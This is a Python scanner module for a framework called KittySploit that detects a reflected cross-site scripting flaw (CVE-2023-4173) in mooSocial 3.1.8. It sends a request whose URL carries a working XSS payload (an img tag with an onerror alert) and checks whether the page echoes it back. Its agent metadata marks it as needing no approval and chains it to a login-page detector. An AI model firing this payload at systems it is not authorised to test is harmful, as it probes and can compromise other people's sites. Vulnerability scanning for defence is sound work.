#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability, which was classified as problematic, was found in mooSocial mooStore 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'mooSocial 3.1.8 - Reflected XSS Detection',
        'description': 'A vulnerability, which was classified as problematic, was found in mooSocial mooStore 3.1.6. Affected is an unknown function of the file /search/index.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'moosocial', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51670',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4173',
            'http://packetstormsecurity.com/files/174016/mooSocial-3.1.8-Cross-Site-Scripting.html',
            'https://vuldb.com/?ctiid.236208',
            'https://vuldb.com/?id.236208',
        ],
        'cve': 'CVE-2023-4173',
    }

    def run(self):
        r = self.http_request(method="GET", path="/classified/%22%3E%3Cimg%20src=a%20onerror=alert('document.domain')%3E/search?category=1", allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("<img src=a onerror=alert('document.domain')>", 'mooSocial',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="mooSocial 3.1.8 - Reflected XSS detected",
                path="/classified/%22%3E%3Cimg%20src=a%20onerror=alert('document.domain')%3E/search?category=1",
            )
            return True
        return False

